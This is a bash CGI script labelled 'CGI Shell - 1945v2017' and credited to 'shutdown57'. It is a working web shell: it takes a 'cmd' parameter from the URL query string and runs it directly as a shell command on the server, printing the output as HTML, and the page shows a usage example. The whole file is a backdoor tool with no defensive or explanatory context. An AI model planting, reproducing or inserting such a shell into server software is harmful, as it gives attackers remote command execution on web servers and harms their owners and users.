#!/bin/bash

echo "Content-type: text/html"
echo ""

echo '<html>'
echo '<head>'
echo '<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">'
echo '<title>CGI Shell - 1945v2017</title>'
echo '</head>'
echo '<body>'
echo '<center><h1>1945v2017</h1><p>c0ded by shutdown57</p><p><b> Usage : http://server.tld/cgi_shell.sh?cmd=ls -lia</b></p></center>'
  OIFS="$IFS"
  IFS="${IFS}&"
  set $QUERY_STRING
  Args="$*"
  IFS="$OIFS"
CMD=""
  for i in $Args ;do
        IFS="${OIFS}="
        set $i
        IFS="${OIFS}"
        case $1 in
                # Don't allow "/" changed to " ". Prevent hacker problems.
                cmd) CMD="`echo $2 | sed 's|[\]||g' | sed 's|%20| |g'`"
                       ;;
                *)     echo "<hr>Warning:"\
                            "<br>Unrecognized variable \'$1\' passed by FORM in QUERY_STRING.<hr>"
                       ;;

        esac
  done

  echo 'Result Command For : '$CMD'' 
  echo '<pre>'
$CMD
  echo '</pre>'
echo '</body>'
echo '</html>'

exit 0
